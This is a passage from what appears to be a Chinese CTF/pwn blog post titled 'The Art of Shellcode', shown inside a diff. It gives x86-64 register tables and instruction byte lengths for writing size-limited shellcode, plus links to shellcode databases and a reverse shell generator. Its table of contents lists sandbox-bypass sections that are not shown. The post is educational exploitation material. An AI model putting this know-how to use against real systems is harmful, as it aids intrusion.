+<td><strong>RDX</strong>​</td>
+<td><strong>EDX</strong>​</td>
+<td><strong>DX</strong>​</td>
+<td><strong>DH</strong>​</td>
+<td><strong>DL</strong>​</td>
+<td>数据寄存器, 第 3 个参数</td>
+</tr>
+<tr>
+<td><strong>RSI</strong>​</td>
+<td><strong>ESI</strong>​</td>
+<td><strong>SI</strong>​</td>
+<td></td>
+<td><strong>SIL</strong>​</td>
+<td>源索引, 第 2 个参数</td>
+</tr>
+<tr>
+<td><strong>RDI</strong>​</td>
+<td><strong>EDI</strong>​</td>
+<td><strong>DI</strong>​</td>
+<td></td>
+<td><strong>DIL</strong>​</td>
+<td>目的索引, 第 1 个参数</td>
+</tr>
+<tr>
+<td><strong>RSP</strong>​</td>
+<td><strong>ESP</strong>​</td>
+<td><strong>SP</strong></td>
+<td></td>
+<td><strong>SPL</strong>​</td>
+<td>栈指针</td>
+</tr>
+<tr>
+<td><strong>RBP</strong>​</td>
+<td><strong>EBP</strong>​</td>
+<td><strong>BP</strong>​</td>
+<td></td>
+<td><strong>BPL</strong>​</td>
+<td>基址指针(栈帧)</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+</li>
+<li><p>很多场景下所能填写的shellcode长度受限，为此，了解各个指令的长度对于手写满足条件的shellcode有着重要的导向作用</p>
+<ul>
+<li><table>
+<thead>
+<tr>
+<th align="left">指令</th>
+<th align="left">常见最小长度</th>
+<th align="left">常见最大长度</th>
+<th align="left">示例（64位模式）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><code>mov</code></strong></td>
+<td align="left"><strong>2 字节</strong></td>
+<td align="left"><strong>7+ 字节</strong></td>
+<td align="left"><code>mov eax, ecx</code>(2B), <code>mov rax, [rsi+rcx*8+10h]</code>(可能5-6B)</td>
+</tr>
+<tr>
+<td align="left"><strong><code>add</code>&#x2F;<code>sub</code></strong></td>
+<td align="left"><strong>2 字节</strong></td>
+<td align="left"><strong>6+ 字节</strong></td>
+<td align="left"><code>add eax, ebx</code>(2B), <code>sub qword ptr [rsp+30h], 1</code>(可能6B)</td>
+</tr>
+<tr>
+<td align="left"><strong><code>push</code>&#x2F;<code>pop</code></strong></td>
+<td align="left"><strong>1 字节</strong></td>
+<td align="left"><strong>5 字节</strong></td>
+<td align="left"><code>push rdi</code>(1B), <code>push 0FFFFFFFFh</code>(5B)</td>
+</tr>
+</tbody></table>
+</li>
+<li><p><code>ret</code>（0xC3）、<code>leave</code>（0xC9）、<code>xchg</code>（0x90 与寄存器编码）</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="八、shellcode网站"><a href="#八、shellcode网站" class="headerlink" title="八、shellcode网站"></a>八、shellcode网站</h2><ol>
+<li><a class="link" target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm">Online x86 and x64 Intel Instruction Assembler (defuse.ca)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>: 在线编写<code>shellcode</code>和反汇编<code>shellcode</code>，目前只支持<code>x86/x64</code></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://shell-storm.org/online/Online-Assembler-and-Disassembler/">Online Assembler and Disassembler (shell-storm.org)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>: 另一个更全的在线编写<code>shellcode</code>和反汇编<code>shellcode</code>网站</li>
+<li><a class="link" target="_blank" rel="noopener" href="https://shell-storm.org/shellcode/index.html">Shellcodes database for study cases (shell-storm.org)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>: <code>shellcode</code>数据库，支持很多指令集与操作系统</li>
+<li><a class="link" target="_blank" rel="noopener" href="https://www.exploit-db.com/shellcodes">Exploit Database Shellcodes (exploit-db.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>: 另一个<code>shellcode</code>数据库</li>
+<li><a class="link" target="_blank" rel="noopener" href="https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>: 生成反弹<code>shell</code>的命令</li>
+</ol>
+<h2 id="九、参考链接"><a href="#九、参考链接" class="headerlink" title="九、参考链接"></a>九、参考链接</h2><p><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/17822153.html">The art of shellcode - LynneHuan - 博客园<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/#%E5%B8%B8%E8%A7%81%E6%8C%87%E4%BB%A4%E5%8F%8A%E5%85%B6%E7%BC%96%E7%A0%81">Pwn.the-Art-of-Shellcode | V3rdant’s Blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://nets.ec/Alphanumeric_shellcode">Alphanumeric shellcode - NetSec<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> The Art of Shellcode</li>
+        <li><strong>作者:</strong> HackC0der</li>
+        <li><strong>创建于
+                :</strong> 2025-12-01 09:51:46</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-12-01 10:19:12
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://hackc0der.github.io/2025/12/01/The-Art-of-Shellcode/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/12/01/CPython-PWN/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">CPython PWN</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">The Art of Shellcode</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E5%99%A8%E7%94%9F%E6%88%90-shellcode"><span class="nav-text">一、使用汇编器生成 shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E6%B1%87%E7%BC%96"><span class="nav-text">（一）汇编</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89shellcode-%E6%9E%84%E5%BB%BA"><span class="nav-text">（二）shellcode 构建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E7%94%9F%E6%88%90%E6%9C%BA%E5%99%A8%E7%A0%81"><span class="nav-text">（三）生成机器码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E4%BD%BF%E7%94%A8-C-%E7%BC%96%E8%AF%91%E6%8F%90%E5%8F%96-shellcode"><span class="nav-text">二、使用 C 编译提取 shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89shellcode-c"><span class="nav-text">（一）shellcode.c</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E7%BC%96%E8%AF%91"><span class="nav-text">（二）编译</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89python3-%E5%89%A5%E7%A6%BB-shellcode"><span class="nav-text">（三）python3 剥离 shellcode</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81C-%E8%AF%AD%E8%A8%80%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96"><span class="nav-text">三、C 语言内联汇编</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E5%9F%BA%E6%9C%AC%E6%A0%BC%E5%BC%8F"><span class="nav-text">（一）基本格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E6%93%8D%E4%BD%9C%E6%95%B0%E7%BA%A6%E6%9D%9F%E8%AF%B4%E6%98%8E"><span class="nav-text">（二）操作数约束说明</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B%EF%BC%9A%E4%BD%BF%E7%94%A8%E8%BE%93%E5%85%A5%E5%92%8C%E8%BE%93%E5%87%BA-%E2%80%94%E2%80%94-C-%E5%8F%98%E9%87%8F%E4%B8%8E%E6%B1%87%E7%BC%96%E4%BA%A4%E4%BA%92"><span class="nav-text">（三）简单示例：使用输入和输出 —— C 变量与汇编交互</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81pwn-shellcraft-%E6%A8%A1%E5%9D%97%E7%94%9F%E6%88%90-shellcode"><span class="nav-text">四、pwn-shellcraft 模块生成 shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89%E9%80%9A%E7%94%A8%E5%8A%9F%E8%83%BD%E4%B8%8E%E5%B8%B8%E7%94%A8%E6%A8%A1%E6%9D%BF"><span class="nav-text">（一）通用功能与常用模板</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E5%85%B8%E5%9E%8B%E7%94%A8%E6%B3%95%E7%A4%BA%E4%BE%8B"><span class="nav-text">（二）典型用法示例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%B8%AE%E5%8A%A9%E6%96%87%E6%A1%A3"><span class="nav-text">（三）帮助文档</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E6%9C%80%E7%9F%ADshellcode"><span class="nav-text">五、最短shellcode</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89getshell"><span class="nav-text">（一）getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89ORW"><span class="nav-text">（二）ORW</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6"><span class="nav-text">六、字符限制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89Alpha3"><span class="nav-text">（一）Alpha3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89ae64"><span class="nav-text">（二）ae64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E6%89%8B%E5%8A%A8%E7%BB%95%E8%BF%87"><span class="nav-text">（三）手动绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E5%9B%9B%EF%BC%89%E9%99%90%E5%88%B6%E5%AD%97%E6%AF%8D%E5%92%8C%E6%95%B0%E5%AD%97"><span class="nav-text">（四）限制字母和数字</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="nav-text">沙箱绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%80%EF%BC%89at-v-2%E6%9B%BF%E6%8D%A2"><span class="nav-text">（一）at&#x2F;v&#x2F;2替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%BA%8C%EF%BC%89%E4%BD%BF%E7%94%A8orw%E8%AF%BB%E5%8F%96flag"><span class="nav-text">（二）使用orw读取flag</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%EF%BC%88%E4%B8%89%EF%BC%89%E5%88%87%E6%8D%A2%E6%8C%87%E4%BB%A4%E6%A8%A1%E5%BC%8F"><span class="nav-text">（三）切换指令模式</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81Tricks"><span class="nav-text">七、Tricks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81shellcode%E7%BD%91%E7%AB%99"><span class="nav-text">八、shellcode网站</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="nav-text">九、参考链接</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">HackC0der</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 2 篇文章
+                    </span>
+                    
+                        <span>
+                            共 12.6k 字
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
